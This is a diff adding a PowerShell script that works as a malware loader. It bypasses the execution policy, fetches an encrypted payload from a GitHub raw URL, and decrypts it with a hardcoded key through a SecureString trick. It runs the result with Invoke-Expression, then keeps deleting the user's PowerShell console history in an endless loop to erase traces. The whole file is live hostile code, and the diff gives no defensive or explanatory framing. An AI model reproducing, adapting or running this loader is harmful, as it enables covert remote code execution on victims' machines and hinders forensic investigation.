@@ -1,0 +1,62 @@
+$encryptionKey = "encryptionKeyencryptionKey123456"
+
+Function DecodeString
+{
+	[CmdletBinding()] Param (
+		[Parameter(Position = 0, ValueFromPipeline = $True)]
+		[ValidateNotNullOrEmpty()]
+		[String]
+		$obfString,
+		
+		[Parameter(Position = 1)]
+        [ValidateNotNullOrEmpty()]
+        [String]
+        $Key		
+    )
+	
+	$keyByte = [System.Convert]::FromBase64String($Key)
+		
+	$command = (New-Object  Management.Automation.PSCredential ' ', ($obfString |ConvertTo-SecureString -Key  $keyByte)).GetNetworkCredential().Password
+
+	return $command
+}
+
+$url = "http://raw.githubusercontent.com/sophie9814/bul/refs/heads/main/"
+$tid = "db"
+
+
+function getinfo
+{
+	$Key = "JkDUVpqcr3llmQukE6FJDw344T6bMdTIBPC91MIiVQI="
+	$endtag = "1.txt"
+	$downpsurl = $url + $endtag
+	$codestring = (New-Object System.Net.WebClient).DownloadString($downpsurl)
+	$comletter = DecodeString -obfString $codestring -Key $Key
+	
+	$result = Invoke-Expression $comletter	
+}
+
+function mainFunc
+{
+	Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass -Force
+	
+	getinfo
+	
+
+	while ($true)
+	{		
+		
+		Start-Sleep -s 2
+		$psLogPath = $env:appdata + "\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
+		$fffd = Test-Path $psLogPath
+		if($fffd -eq $True)
+		{
+			Remove-Item -path $psLogPath -Recurse
+		}
+		Start-Sleep -s 5
+	}
+	
+}
+mainFunc
+
+
